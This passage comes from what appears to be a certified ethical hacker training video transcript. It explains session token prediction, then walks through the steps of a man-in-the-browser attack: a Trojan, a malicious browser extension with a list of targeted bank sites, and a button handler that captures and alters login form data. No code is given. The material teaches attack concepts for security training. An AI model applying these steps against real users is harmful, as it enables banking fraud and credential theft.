that's\n\n677\n00:31:45.680 --> 00:31:48.720\nalmost the size of the screen\nat the same time we're talking.\n\n678\n00:31:48.720 --> 00:31:50.790\n&gt;&gt; I have trouble finding\nmy cursor occasionally so\n\n679\n00:31:50.790 --> 00:31:52.690\nI bump them up in size a little bit.\n\n680\n00:31:52.690 --> 00:31:55.610\n&gt;&gt; Well they do say size matters,\nso that is important just to know.\n\n681\n00:31:55.610 --> 00:31:58.669\nAll right, so we have whatever\nthe URL string would be and remember,\n\n682\n00:31:58.669 --> 00:32:01.699\nthe URL is the URL of the web server or\nwhatever we're connected to.\n\n683\n00:32:01.699 --> 00:32:06.233\nThat's always going to be constant cuz\nwe're connected to the user that we're\n\n684\n00:32:06.233 --> 00:32:11.106\ntrying to hack the session for essentially\nas we're capturing this data In the stream\n\n685\n00:32:11.106 --> 00:32:15.524\nand our passive sniffing, we're gonna\nsee this coming in from a web server.\n\n686\n00:32:15.524 --> 00:32:20.832\nThat URL is gonna be whatever the user is\nusing, and that URL is gonna be constant.\n\n687\n00:32:20.832 --> 00:32:21.793\nThat's why we're not\nbothering to write it out.\n\n688\n00:32:21.793 --> 00:32:24.310\nIt's just gonna be\nwhatever the web URL is.\n\n689\n00:32:24.310 --> 00:32:27.980\nThen what is gonna change is that\nstring that comes after, right.\n\n690\n00:32:27.980 --> 00:32:33.880\nSo, the four letter alpha, in this case\nmy name, is gonna stay constant, right?\n\n691\n00:32:33.880 --> 00:32:35.345\nSo that's gonna be the same in everyone.\n\n692\n00:32:35.345 --> 00:32:38.610\nThe date,\nobviously depending on when we're doing\n\n693\n00:32:38.610 --> 00:32:42.345\nthis,if it's consistently the same day,\nthen that's gonna stay the same, right?\n\n694\n00:32:42.345 --> 00:32:45.020\nSo that part of the string\nwill typically stay the same.\n\n695\n00:32:45.020 --> 00:32:46.692\nWhat's modified is the time, right?\n\n696\n00:32:46.692 --> 00:32:48.315\nSo the timestamp will typically change.\n\n697\n00:32:48.315 --> 00:32:51.766\nSo let's say the next one down is,\n\n698\n00:32:51.766 --> 00:32:57.609\ninstead of 21 is maybe 1601,\nso 1601, right?\n\n699\n00:32:57.609 --> 00:32:58.995\nAnd then put 32.\n\n700\n00:32:58.995 --> 00:33:02.105\nSo this is like roughly\njust over a minute later.\n\n701\n00:33:02.105 --> 00:33:03.390\n&gt;&gt; Mm-hm.\n&gt;&gt; Right, if you think about the logic\n\n702\n00:33:03.390 --> 00:33:04.260\nof that, right?\n\n703\n00:33:04.260 --> 00:33:09.140\nAnd then you make the next one down,\nlet's do 1602 and\n\n704\n00:33:09.140 --> 00:33:12.990\nleave it at 21.\n\n705\n00:33:12.990 --> 00:33:15.620\nSo that's less than a minute,\nyou know, later.\n\n706\n00:33:15.620 --> 00:33:21.020\nSo you could see the idea here is that\nthese strings as we add the whole\n\n707\n00:33:21.020 --> 00:33:25.040\nthing together are actually unique, right,\nbut there's only part that's unique.\n\n708\n00:33:25.040 --> 00:33:29.143\nAnd so if we now as the attacker can begin\nto figure this pattern out and say okay,\n\n709\n00:33:29.143 --> 00:33:32.141\nwell, if I've gotta guess this,\nso I'm gonna predict,\n\n710\n00:33:32.141 --> 00:33:34.330\nright, what the next one would be.\n\n711\n00:33:34.330 --> 00:33:38.040\nAnd if I predict correctly, I can\nessentially take that session token and\n\n712\n00:33:38.040 --> 00:33:39.040\nI can use it.\n\n713\n00:33:39.040 --> 00:33:42.090\nI now have to figure out\nthe combination of variables and\n\n714\n00:33:42.090 --> 00:33:45.730\nI have to understand what will be\nheld constant and what will change.\n\n715\n00:33:45.730 --> 00:33:48.770\nAnd if I can analyze this,\nexamine this, and\n\n716\n00:33:48.770 --> 00:33:53.200\nI can ultimately figure this out,\nI could predict the session token.\n\n717\n00:33:53.200 --> 00:33:56.340\nAnd as a result,\nI can get the session ID that I can use.\n\n718\n00:33:56.340 --> 00:33:59.180\nAnd so\nall I would have to do as an attacker\n\n719\n00:33:59.180 --> 00:34:03.585\nis get enough of these coming in\nin my automated capture program,\n\n720\n00:34:03.585 --> 00:34:07.030\nright, to be able to get a pretty\ngood read on the sequence.\n\n721\n00:34:07.030 --> 00:34:09.780\nAnd again, most of this is done\nthrough a capture program.\n\n722\n00:34:09.780 --> 00:34:12.170\nIt's automated,\nmeaning we get all these strings in,\n\n723\n00:34:12.170 --> 00:34:16.080\nwe analyze them, the system does\nthe prediction for us, it's computerized.\n\n724\n00:34:16.080 --> 00:34:17.320\nWe don't have to know much.\n\n725\n00:34:17.320 --> 00:34:20.510\nImagine you sitting here trying to\nfigure this out manually, right?\n\n726\n00:34:20.510 --> 00:34:24.550\nIt can be done, but it's very difficult\nto do it quickly enough that you can then\n\n727\n00:34:24.550 --> 00:34:28.220\ngain an advantage because every time you\nthink you've got it figured out, right?\n\n728\n00:34:28.220 --> 00:34:30.820\nThat token's already probably been issued.\n\n729\n00:34:30.820 --> 00:34:33.400\nSo as a result you've then got\nto go back to the drawing board.\n\n730\n00:34:33.400 --> 00:34:36.020\nSo we use automated tools to\nmake this quicker, clearly.\n\n731\n00:34:36.020 --> 00:34:38.940\nAnd you need to remember computers are\nreally good at spotting patterns, right?\n\n732\n00:34:38.940 --> 00:34:40.685\nI mean, that's what we use them for.\n\n733\n00:34:40.685 --> 00:34:43.695\nSo when it spits out and says,\nokay, yeah, based on this,\n\n734\n00:34:43.695 --> 00:34:46.325\nI think this is the next one,\nthat's what you go with.\n\n735\n00:34:46.325 --> 00:34:50.225\nAnd if that works, you've essentially\npredicted a session token.\n\n736\n00:34:50.225 --> 00:34:53.650\nSo it sounds really hard to do,\nas you were saying, but you know,\n\n737\n00:34:53.650 --> 00:34:56.310\na lot of this because we automate\nit we use tools to do it and\n\n738\n00:34:56.310 --> 00:34:58.860\nit's a relatively simplistic concept.\n\n739\n00:34:58.860 --> 00:35:01.180\nI'm not indicating by saying that,\nby the way, it's not hard to do.\n\n740\n00:35:01.180 --> 00:35:03.500\nI'm just pointing out\nthe mechanics behind it,\n\n741\n00:35:03.500 --> 00:35:06.085\nthe thought process is\nrelatively straightforward.\n\n742\n00:35:06.085 --> 00:35:08.480\n&gt;&gt; Mm-hm.\n&gt;&gt; Look at the incoming traffic pattern.\n\n743\n00:35:08.480 --> 00:35:12.680\nAnd then based on the values we see,\nextrapolate out and\n\n744\n00:35:12.680 --> 00:35:15.350\npredict what the next five, or\nten, or 20 are gonna be, and\n\n745\n00:35:15.350 --> 00:35:17.200\nlet's figure out which\none what we need to use.\n\n746\n00:35:17.200 --> 00:35:18.790\nThat's really all we're doing.\n\n747\n00:35:18.790 --> 00:35:22.460\nSo as long as we can get good as that,\nthen we're able to use that knowledge,\n\n748\n00:35:22.460 --> 00:35:24.670\npay it forward so to speak, and\nthen take over the session.\n\n749\n00:35:24.670 --> 00:35:26.250\n&gt;&gt; Nice.\n&gt;&gt; So yeah, it's kind of cool.\n\n750\n00:35:26.250 --> 00:35:27.930\nWe could do that on a Sunday afternoon.\n\n751\n00:35:27.930 --> 00:35:28.870\nNot much going on.\n\n752\n00:35:28.870 --> 00:35:29.770\n&gt;&gt; No.\n&gt;&gt; In between mowing the lawn.\n\n753\n00:35:29.770 --> 00:35:31.050\n&gt;&gt; That's right.\n&gt;&gt; You like mowing the lawn?\n\n754\n00:35:31.050 --> 00:35:32.490\n&gt;&gt; I do like mowing.\n&gt;&gt; Yeah, I hate mowing the lawn.\n\n755\n00:35:32.490 --> 00:35:34.090\nSee I got smart a few years ago.\n\n756\n00:35:34.090 --> 00:35:37.880\nI realized that if I had to do it,\nit would never get done.\n\n757\n00:35:37.880 --> 00:35:39.190\nSo I pay somebody.\n\n758\n00:35:39.190 --> 00:35:40.920\n&gt;&gt; Okay.\n&gt;&gt; Which they do it for me.\n\n759\n00:35:40.920 --> 00:35:42.430\n&gt;&gt; There's two options here in Florida,\nright?\n\n760\n00:35:42.430 --> 00:35:45.860\nYou either pay somebody to do it or\nyou throw down rocks.\n\n761\n00:35:45.860 --> 00:35:48.300\n&gt;&gt; But\nthen everything grows up between it.\n\n762\n00:35:48.300 --> 00:35:49.520\nI talked about that with my wife.\n\n763\n00:35:49.520 --> 00:35:52.290\nI'm like we could have,\nnot that we would have a rock garden for\n\n764\n00:35:52.290 --> 00:35:53.770\na yard, that's like Las Vegas.\n\n765\n00:35:53.770 --> 00:35:56.820\nThat's what they do out there because they\ndon't have the water to actually water\n\n766\n00:35:56.820 --> 00:35:57.770\nthe grass.\n\n767\n00:35:57.770 --> 00:36:00.430\nBut she said in certain areas we have\n\n768\n00:36:00.430 --> 00:36:04.250\na bed kind of thing in the front of\nthe yard where there's mulch and whatever.\n\n769\n00:36:04.250 --> 00:36:07.140\nAnd she took a fling to try and\nset up a butterfly garden.\n\n770\n00:36:07.140 --> 00:36:08.750\nIt's actually a pretty cool concept.\n\n771\n00:36:08.750 --> 00:36:10.920\nBut she's not happy with how it came out,\nso\n\n772\n00:36:10.920 --> 00:36:13.330\nnow she's thinking,\nI wanna do something else.\n\n773\n00:36:13.330 --> 00:36:15.710\nAnd she said well maybe\nI'll just put rocks down.\n\n774\n00:36:15.710 --> 00:36:18.670\nBut then she said yeah, but then I gotta,\nif you do it, like you were saying,\n\n775\n00:36:18.670 --> 00:36:19.700\nyou've gotta do it the right way.\n\n776\n00:36:19.700 --> 00:36:21.380\nYou've gotta put down the weed barrier,\nright?\n\n777\n00:36:21.380 --> 00:36:24.030\nYou've gotta put down the whatever\nthey call it the terminal barrier or\n\n778\n00:36:24.030 --> 00:36:25.850\nwhatever it is, and\nyou gotta line the whole thing so\n\n779\n00:36:25.850 --> 00:36:27.900\nthat they don't grow up\nin between the rocks.\n\n780\n00:36:27.900 --> 00:36:30.650\nOtherwise, you have a weed rock garden,\nand\n\n781\n00:36:30.650 --> 00:36:33.330\nthen that is a lot tougher to deal with,\nbecause you can't go in with the weed\n\n782\n00:36:33.330 --> 00:36:36.170\nwhacker and deal with that,\nbecause you now create flying missiles.\n\n783\n00:36:36.170 --> 00:36:39.930\nThat essentially can not only hurt you,\nbut cause you a lot of pain and your\n\n784\n00:36:39.930 --> 00:36:42.750\nneighbors a lot of damage, which means\nyour insurance bill goes through the roof.\n\n785\n00:36:42.750 --> 00:36:44.260\nAnd that's never a good thing.\n\n786\n00:36:44.260 --> 00:36:45.400\nWe don't want to do that.\n\n787\n00:36:45.400 --> 00:36:47.648\nSo yeah,\nI basically just bypass all that and\n\n788\n00:36:47.648 --> 00:36:51.580\nI pay a very nice gentleman who takes\ncare of it for us, does a great job.\n\n789\n00:36:51.580 --> 00:36:55.130\nAnd I will be happy to give you\nhis name if you'd like because\n\n790\n00:36:55.130 --> 00:36:58.948\nit's a lot nicer because then\nyou could spend time doing this.\n\n791\n00:36:58.948 --> 00:37:02.429\n[CROSSTALK] You can do session\nhijacking which is a lot more valuable.\n\n792\n00:37:02.429 --> 00:37:03.050\n&gt;&gt; It is.\n\n793\n00:37:03.050 --> 00:37:06.330\n&gt;&gt; Because you get the money to then\nbe able to pay for the lawn care.\n\n794\n00:37:06.330 --> 00:37:07.520\n&gt;&gt; I like this thought process.\n\n795\n00:37:07.520 --> 00:37:08.960\n&gt;&gt; Yes, exactly.\n\n796\n00:37:08.960 --> 00:37:10.940\nDon't do that by the way, right?\n\n797\n00:37:10.940 --> 00:37:14.720\nClearly tongue and cheek,\ndo not do that under any circumstances.\n\n798\n00:37:14.720 --> 00:37:17.280\nPay for lawn care but\ndo not use ill gotten gains to pay for\n\n799\n00:37:17.280 --> 00:37:18.742\nlawn care is what I'm suggesting to you.\n\n800\n00:37:18.742 --> 00:37:22.990\nAll right, so make sure we understand\nhow we can comprise the session ID.\n\n801\n00:37:22.990 --> 00:37:26.640\nI do believe we went through and\ncreated a rather interesting list.\n\n802\n00:37:26.640 --> 00:37:27.660\nThe top of that list,\n\n803\n00:37:27.660 --> 00:37:31.230\nfirst 14 steps on the list was how to\nexecute a man on the browser attack.\n\n804\n00:37:31.230 --> 00:37:32.910\n&gt;&gt; Looking.\n&gt;&gt; I wanna take a look at that if we can.\n\n805\n00:37:32.910 --> 00:37:36.520\nGo through that, this will kind of explain\na little bit more about what we're doing.\n\n806\n00:37:36.520 --> 00:37:38.100\nCan we zoom in just a touch?\n\n807\n00:37:38.100 --> 00:37:38.820\n&gt;&gt; Absolutely.\n\n808\n00:37:38.820 --> 00:37:40.210\n&gt;&gt; Will that be possible?\n\n809\n00:37:40.210 --> 00:37:41.740\nAll righty.\n\n810\n00:37:41.740 --> 00:37:43.740\nOkay, cool.\nSo we're gonna go through this.\n\n811\n00:37:43.740 --> 00:37:46.310\nMike was kind enough to put\nthese all together for us.\n\n812\n00:37:46.310 --> 00:37:49.640\nAnd the concept, just let me set up the\nconcept in the man-in-the-browser attacks,\n\n813\n00:37:49.640 --> 00:37:51.330\nwe talk a lot about man-in-the-middle.\n\n814\n00:37:51.330 --> 00:37:53.990\nWe haven't really talked as\nmuch about man-in-the-browser.\n\n815\n00:37:53.990 --> 00:37:57.010\nBut let's talk about this,\ntalk about the concept then we're gonna\n\n816\n00:37:57.010 --> 00:37:58.780\ngo through the steps of how\nto actually execute one.\n\n817\n00:37:58.780 --> 00:38:03.190\nSo, we use some sort of a Trojan horse\nto essentially intercept calls, right?\n\n818\n00:38:03.190 --> 00:38:07.290\nIntercept traffic back and forth between\nthe browser and the security mechanism or\n\n819\n00:38:07.290 --> 00:38:08.540\nthe security libraries,\n\n820\n00:38:08.540 --> 00:38:11.450\nthe DLLs that are being used in\nthe browser to create security, right?\n\n821\n00:38:11.450 --> 00:38:14.840\nSo, SecureBrowser.dll or whatever it is,\n\n822\n00:38:14.840 --> 00:38:17.630\nwe're gonna try to intercept that\nwith a Trojan and manipulate that.\n\n823\n00:38:17.630 --> 00:38:20.830\nThat's the basic concept and you can\nsee that in the first couple of steps,\n\n824\n00:38:20.830 --> 00:38:21.700\nwe'll get to that in a minute.\n\n825\n00:38:22.940 --> 00:38:26.710\nOnce we have the Trojan in, we're then\nable to manipulate the browser and\n\n826\n00:38:26.710 --> 00:38:31.350\nmanipulate the data flow, and control the\nexpectations as to what's gonna happen.\n\n827\n00:38:31.350 --> 00:38:34.170\nOur main objective here more often\nthan not with this is some sort of\n\n828\n00:38:34.170 --> 00:38:35.010\nfinancial fraud.\n\n829\n00:38:35.010 --> 00:38:39.380\nSo typically we're using browsers\ntoday a lot of times to get into\n\n830\n00:38:39.380 --> 00:38:43.040\na web API of some kind\nto enter a banking site,\n\n831\n00:38:43.040 --> 00:38:46.840\npay a bill, check your balance online,\nwhatever the case may be.\n\n832\n00:38:46.840 --> 00:38:47.800\nAnd as a result of that,\n\n833\n00:38:47.800 --> 00:38:52.640\nif we can manipulate that process through\nthe browser by manipulating the actual\n\n834\n00:38:52.640 --> 00:38:56.880\nsecurity functions with the Trojan,\nwe can compromise the transaction and\n\n835\n00:38:56.880 --> 00:38:59.680\nthat's more or less what\na Man-in-the-Browser attack will be.\n\n836\n00:38:59.680 --> 00:39:01.060\nCapital M, capital B by the way.\n\n837\n00:39:01.060 --> 00:39:03.740\nMy mistake, I didn't tell you that when\nwe did that just so we have it right.\n\n838\n00:39:03.740 --> 00:39:04.584\nBut Mike will fix that.\n\n839\n00:39:04.584 --> 00:39:06.600\nThat's not a big deal, that's easy to do.\n\n840\n00:39:06.600 --> 00:39:07.760\nSo let's go through,\n\n841\n00:39:07.760 --> 00:39:11.570\nlet's talk about the steps involved\nin the Man-in-the-Browser attack.\n\n842\n00:39:11.570 --> 00:39:14.880\nSo step one, as I said,\nwe infect the computer with a Trojan.\n\n843\n00:39:14.880 --> 00:39:18.934\nNow we've talked a lot about how to do\nthat in malware, in our malware episodes,\n\n844\n00:39:18.934 --> 00:39:21.151\ntalked all about Trojans and\nwhat they are.\n\n845\n00:39:21.151 --> 00:39:25.209\nAnd we actually showed you in\nthe sniffing episodes how we could create\n\n846\n00:39:25.209 --> 00:39:29.541\nan attack package, an APK package using\nMetasploit to infect a mobile, or\n\n847\n00:39:29.541 --> 00:39:32.016\nnot in the stiffing one rather I'm sorry,\n\n848\n00:39:32.016 --> 00:39:35.558\nin the mobile platform once we\ntalked about hacking mobile.\n\n849\n00:39:35.558 --> 00:39:39.772\nWe did that demo where,we\nactually created,I created in\n\n850\n00:39:39.772 --> 00:39:45.018\nthe ICALLI LINUX box using Metasploit and\nusing the Android Metapeter or\n\n851\n00:39:45.018 --> 00:39:48.384\nMetapreter, excuse me, I always say Peter.\n\n852\n00:39:48.384 --> 00:39:51.251\n&gt;&gt; [LAUGH]\n&gt;&gt; Metapreter tool, we actually went and\n\n853\n00:39:51.251 --> 00:39:55.503\ncreated an APK file, an attack file\ncalled backdoor.apk, that we could\n\n854\n00:39:55.503 --> 00:39:59.962\nthen use to deploy and take remote control\nof the system through a Trojan, and\n\n855\n00:39:59.962 --> 00:40:02.520\nthen be able to manipulate\na mobile device.\n\n856\n00:40:02.520 --> 00:40:04.560\nSo we went through that demo and\nshowed you how to do that.\n\n857\n00:40:04.560 --> 00:40:05.114\nKind of cool,\n\n858\n00:40:05.114 --> 00:40:08.270\nif you haven't seen that definitely take\na look at the hacking mobile episodes.\n\n859\n00:40:08.270 --> 00:40:10.493\nAnd we did go in and\ndo a pretty cool demo there and\n\n860\n00:40:10.493 --> 00:40:12.780\nshowed you how to walk through there and\ndo that.\n\n861\n00:40:12.780 --> 00:40:15.341\nSo when we're talking\nabout Trojaning a system.\n\n862\n00:40:15.341 --> 00:40:17.150\nWe're talking about something like that.\n\n863\n00:40:17.150 --> 00:40:18.627\nHowever, the Trojan gets in there.\n\n864\n00:40:18.627 --> 00:40:20.242\nIt could be a variety of ways.\n\n865\n00:40:20.242 --> 00:40:23.317\nSome may use a baiting attack for\ninstance, that we talked about in malware,\n\n866\n00:40:23.317 --> 00:40:24.843\nto leave thumb drives laying around.\n\n867\n00:40:24.843 --> 00:40:26.438\nAnd maybe get somebody to pick that up.\n\n868\n00:40:26.438 --> 00:40:31.015\n&gt;&gt; Mm-hm.\nWe may put malware on a download site.\n\n869\n00:40:31.015 --> 00:40:35.045\nSo some kind of drive by attack or\nsome sort of cross site request forgery or\n\n870\n00:40:35.045 --> 00:40:38.135\ncross site scripting attack which we'll\nbe talking about here a little later on,\n\n871\n00:40:38.135 --> 00:40:42.770\nin one of the upcoming episodes for\nthe whole idea of session hijacking.\n\n872\n00:40:42.770 --> 00:40:45.200\nWe'll talk about how cross\nsite scripting works.\n\n873\n00:40:45.200 --> 00:40:47.930\nAnd so, that may be a way that\nwe actually deliver the Trojan.\n\n874\n00:40:47.930 --> 00:40:50.870\nThere's a lot of different ways to\nget Trojan software into a system.\n\n875\n00:40:50.870 --> 00:40:53.330\nWhatever we do,\nthe goal is we have to Trojan the box.\n\n876\n00:40:53.330 --> 00:40:58.500\nWe have to somehow manipulate that\ntargets environment to run the malware.\n\n877\n00:40:58.500 --> 00:40:59.340\nSo now, we've done that.\n\n878\n00:40:59.340 --> 00:41:00.994\nSo we're on step 1,\nlet's go back and take a look.\n\n879\n00:41:00.994 --> 00:41:05.314\nSo step 2, Trojan installs malicious code,\nwhatever the code is they were injecting.\n\n880\n00:41:05.314 --> 00:41:08.490\nSo remember,\nTrojan is sent with two programs in one.\n\n881\n00:41:08.490 --> 00:41:11.730\nWe have the outer program, the good\nprogram, and then we have the inner\n\n882\n00:41:11.730 --> 00:41:16.470\nprogram that's wrapped up and essentially\nobfuscated, that is the bad program.\n\n883\n00:41:16.470 --> 00:41:18.219\nAnd so,\nwe wanna make sure we understand that,\n\n884\n00:41:18.219 --> 00:41:21.152\nwe are talking about a piece of software\nthat will do something legitimate, but\n\n885\n00:41:21.152 --> 00:41:22.891\nit's also gonna do something illegitimate.\n\n886\n00:41:22.891 --> 00:41:24.480\nWe have to understand that\nthere's a distinction there.\n\n887\n00:41:24.480 --> 00:41:28.801\nSo we install the malicious code which\nis the bad payload in the Trojan.\n\n888\n00:41:28.801 --> 00:41:32.118\nThese are extension files that are gonna\nmanipulate the browser, remember,\n\n889\n00:41:32.118 --> 00:41:34.531\nwe're gonna look to manipulate\nthe DLL functionality or\n\n890\n00:41:34.531 --> 00:41:37.090\nsome sort of security\nfunctionality in the browser.\n\n891\n00:41:37.090 --> 00:41:39.010\nAnd we save it into\nthe browser config file.\n\n892\n00:41:39.010 --> 00:41:43.160\nNow, keep in mind, this is gonna\nvary a little bit by browser.\n\n893\n00:41:43.160 --> 00:41:46.050\nSo one of things we have to do, going\nagain, reaching all the way back to almost\n\n894\n00:41:46.050 --> 00:41:51.100\nthe very beginning of our conversations\nin CEH, to the early episodes.\n\n895\n00:41:51.100 --> 00:41:53.180\nThinking about reconnaissance,\nthinking about fingerprinting,\n\n896\n00:41:53.180 --> 00:41:55.170\nin particular, in those episodes.\n\n897\n00:41:55.170 --> 00:41:57.800\nWe have to understand\nthe browser that's being used by\n\n898\n00:41:57.800 --> 00:42:00.550\nthe victim in order to understand\nhow to craft this attack.\n\n899\n00:42:00.550 --> 00:42:02.720\nBecause we can't just\nuse a generic Trojan.\n\n900\n00:42:02.720 --> 00:42:08.310\nWe have to use a Trojan that is\nspecific to the particular browsers.\n\n901\n00:42:08.310 --> 00:42:12.973\nSo, there's still, there are Trojans for\nGoogle, for Chrome, there are Trojans for\n\n902\n00:42:12.973 --> 00:42:17.250\nSafari, there are Trojans for\nFirefox, there are Trojans for IE.\n\n903\n00:42:17.250 --> 00:42:19.990\nSo we have to think about the fact that\ndepending on the browser being used,\n\n904\n00:42:19.990 --> 00:42:22.870\nwe have to adjust that slightly\nbecause the Trojan meant for\n\n905\n00:42:22.870 --> 00:42:26.480\none, will not work on the others\nbecause the promise, the DLLs, and\n\n906\n00:42:26.480 --> 00:42:28.960\nthe security functionality, and\nthe config files are all different and\n\n907\n00:42:28.960 --> 00:42:32.760\nwe have to manipulate them specific\nto that particular browser.\n\n908\n00:42:32.760 --> 00:42:36.336\nSo, this is a very uniquely crafted\nattack in the sense that we do have\n\n909\n00:42:36.336 --> 00:42:39.215\nunderstand a lot of\ninformation ahead of time.\n\n910\n00:42:39.215 --> 00:42:41.045\nAnd so, we're building that knowledge.\n\n911\n00:42:41.045 --> 00:42:46.795\nWe're late in the game here, talking\nabout these particular sets of skills.\n\n912\n00:42:46.795 --> 00:42:49.892\nSession hijacking,\nas I said when we started this episode,\n\n913\n00:42:49.892 --> 00:42:53.402\nbuilds on knowledge of, and awareness of,\nthings that have come before.\n\n914\n00:42:53.402 --> 00:42:56.072\nWe often say we stand on\nthe shoulders of giants.\n\n915\n00:42:56.072 --> 00:42:57.412\nWhen we do this kind of stuff.\n\n916\n00:42:57.412 --> 00:43:00.442\nAnd we stand on the shoulders of\nreconning and fingerprinting and\n\n917\n00:43:00.442 --> 00:43:02.550\nsniffing, and malware.\n\n918\n00:43:02.550 --> 00:43:06.740\nAnd these are a deniable service cuz this\nis all that knowledge wrapped up from five\n\n919\n00:43:06.740 --> 00:43:10.730\nother knowledge areas in a series of\nepisodes that we've talked about to get to\n\n920\n00:43:10.730 --> 00:43:11.650\nthis point.\n\n921\n00:43:11.650 --> 00:43:15.740\nNot to mention the stuff that comes after\nus just chronologically in these episodes\n\n922\n00:43:15.740 --> 00:43:19.190\nas I mentioned, things like the hacking\nweb apps and the SQL injection and\n\n923\n00:43:19.190 --> 00:43:21.810\nall of that stuff that potentially\nmaybe at the end of this road.\n\n924\n00:43:21.810 --> 00:43:22.727\nSo keep that in mind.\n\n925\n00:43:22.727 --> 00:43:24.910\nThis is not just a moment in time,\nin other words,\n\n926\n00:43:24.910 --> 00:43:29.090\nwe ave to have a series of skills that we\nbuild on and really aggregate together\n\n927\n00:43:29.090 --> 00:43:32.300\nto be successful at doing this\ncomplicated stuff as Mike pointed out.\n\n928\n00:43:32.300 --> 00:43:33.960\n&gt;&gt; It is.\n&gt;&gt; So we're on step what?\n\n929\n00:43:33.960 --> 00:43:34.700\nWe're on step two.\n\n930\n00:43:34.700 --> 00:43:37.430\n&gt;&gt; Two.\n&gt;&gt; So step 3, after the user restarts\n\n931\n00:43:37.430 --> 00:43:40.938\nthe browser, malicious code in the form\nof extension files becomes loaded.\n\n932\n00:43:40.938 --> 00:43:44.930\nRemember, you have a lot of times we do\nthis manipulation, we then have to restart\n\n933\n00:43:44.930 --> 00:43:47.940\nthe browser to make changes because\nthe config file is locked open,\n\n934\n00:43:47.940 --> 00:43:49.920\nwe're making changes to it,\nwe have to reload it.\n\n935\n00:43:49.920 --> 00:43:52.560\nNow that wouldn't be hard to do,\nthe user just simply, we wait around.\n\n936\n00:43:52.560 --> 00:43:54.650\nThe user will restart\nthe browser at some point.\n\n937\n00:43:54.650 --> 00:43:57.860\nNot hard to do if we want to\nencourage them politely, to do so.\n\n938\n00:43:57.860 --> 00:44:00.870\nWe may have a little function of that\nmalware that either shuts the browser\n\n939\n00:44:00.870 --> 00:44:01.990\nunexpectedly.\n\n940\n00:44:01.990 --> 00:44:04.459\nAnd the user doesn't realize it and\njust, whatever.\n\n941\n00:44:04.459 --> 00:44:05.120\nIE, right?\n&gt;&gt; We're used to it.\n\n942\n00:44:05.120 --> 00:44:05.887\n&gt;&gt; Crashes all the time.\n\n943\n00:44:05.887 --> 00:44:06.450\n&gt;&gt; Yeah.\n\n944\n00:44:06.450 --> 00:44:07.910\n&gt;&gt; Right?\nThat's pretty standard.\n\n945\n00:44:07.910 --> 00:44:10.613\nAnd/or we may just restart the machine.\n\n946\n00:44:10.613 --> 00:44:13.200\nThere's all these ways we could do it,\nit really just depends.\n\n947\n00:44:13.200 --> 00:44:15.739\nRemember, if we're attacking\na machine after hours late at night,\n\n948\n00:44:15.739 --> 00:44:18.382\nwe know nobody's there,\nit's been left on, restarting it's easy.\n\n949\n00:44:18.382 --> 00:44:20.050\n&gt;&gt; Yeah.\n&gt;&gt; Just recycle the browser,\n\n950\n00:44:20.050 --> 00:44:21.280\nit's not hard to do.\n\n951\n00:44:21.280 --> 00:44:25.955\nStep 4, the extension file registers\na handler for every visit to the web page.\n\n952\n00:44:25.955 --> 00:44:30.035\nSo now it's gonna have this process\nthat we're gonna start using\n\n953\n00:44:30.035 --> 00:44:31.565\nthat's gonna gather this information.\n\n954\n00:44:31.565 --> 00:44:35.142\nThe handler is gonna be the malware\ncode that's executing and\n\n955\n00:44:35.142 --> 00:44:37.013\ncontrolling what's going on.\n\n956\n00:44:37.013 --> 00:44:40.461\nAnd so, it's gonna start looking for\na certain warning signs and processes and\n\n957\n00:44:40.461 --> 00:44:42.527\nthings that we wanna\nbe able to manipulate.\n\n958\n00:44:42.527 --> 00:44:46.172\nSo when the page is loaded,\nthe extension uses the URL and matches it.\n\n959\n00:44:46.172 --> 00:44:48.910\nIt says here were the list of known sites,\ntargeted for the attacks.\n\n960\n00:44:48.910 --> 00:44:52.280\nSo, we now start manipulating the traffic\nflow, looking at what's happening and\n\n961\n00:44:52.280 --> 00:44:55.630\ntrying to understand, are we going to\na site like a bank that we want to go to.\n\n962\n00:44:55.630 --> 00:44:58.000\nSo we have a target list essentially,\nright?\n\n963\n00:44:58.000 --> 00:45:04.580\nWe say yeah, bankofamerica.com,\nchase.com, wellsfargo.com, whatever.\n\n964\n00:45:04.580 --> 00:45:06.500\nThose are the sites we wanna target.\n\n965\n00:45:06.500 --> 00:45:08.410\nSo we've got a little list that this,\n\n966\n00:45:08.410 --> 00:45:11.220\nit's like a shopping list, that\nthe malware's out there going, all right,\n\n967\n00:45:11.220 --> 00:45:15.260\nso I'm looking at the web traffic and\nwhenever the handler sees these matches,\n\n968\n00:45:15.260 --> 00:45:18.530\nit's gonna grab that session and\nit's gonna start manipulating them.\n\n969\n00:45:18.530 --> 00:45:19.963\nThe other ones are gonna go bye,\n\n970\n00:45:19.963 --> 00:45:22.960\nwe go to CNN.com,\nwe go to gotomypc.com or whatever,\n\n971\n00:45:22.960 --> 00:45:26.050\nwe're not gonna care about those, we're\ngonna ignore those, so they're irrelevant.\n\n972\n00:45:26.050 --> 00:45:31.460\nSo we're selectively targeting based on a\ntarget attack list that we load with this.\n\n973\n00:45:31.460 --> 00:45:34.970\nThe user logs in, obviously securely\nto whatever the website is.\n\n974\n00:45:34.970 --> 00:45:37.568\nSo, unbeknownst to them,\nwe're monitoring, they don't know.\n\n975\n00:45:37.568 --> 00:45:38.750\nThey just go on about their stuff.\n\n976\n00:45:38.750 --> 00:45:42.000\nOkay I'm going to go check my balance, I'm\ngonna login now and I'm gonna sit down,\n\n977\n00:45:42.000 --> 00:45:47.200\nand user Adam and password Adam cuz I'm\nvery secure, so that's what I would do.\n\n978\n00:45:47.200 --> 00:45:51.100\nAnd then as a result of that,\nI'm gonna log in but what's gonna happen?\n\n979\n00:45:51.100 --> 00:45:54.390\nAt step 7, the Trojan registers\na button event handler.\n\n980\n00:45:54.390 --> 00:45:55.920\nTypically this is how we do it.\n\n981\n00:45:55.920 --> 00:45:58.802\nWhen a specific page load is detected for\na certain pattern, again,\n\n982\n00:45:58.802 --> 00:46:01.486\nthat we're looking for,\nI would compare it to the target list so\n\n983\n00:46:01.486 --> 00:46:02.897\nwe know hey they're logging in.\n\n984\n00:46:02.897 --> 00:46:06.899\nWe wanna know that when the user clicks on\nthat button, the extension extracts all\n\n985\n00:46:06.899 --> 00:46:09.960\nthe data from all the form fields and\nmodifies the values.\n\n986\n00:46:09.960 --> 00:46:15.200\nSo essentially, what we do is we say hey,\nyou're going to securebank.com.\n\n987\n00:46:15.200 --> 00:46:17.980\nWe're gonna manipulate that page,\nand we're gonna actually,\n\n988\n00:46:17.980 --> 00:46:22.510\nwhen you put your form data in there and\nyou click Go or log in, that budding\n\n989\n00:46:22.510 --> 00:46:26.280\ncontrol you click is actually controlled\nby us, it's controlled by the malware.\n\n990\n00:46:26.280 --> 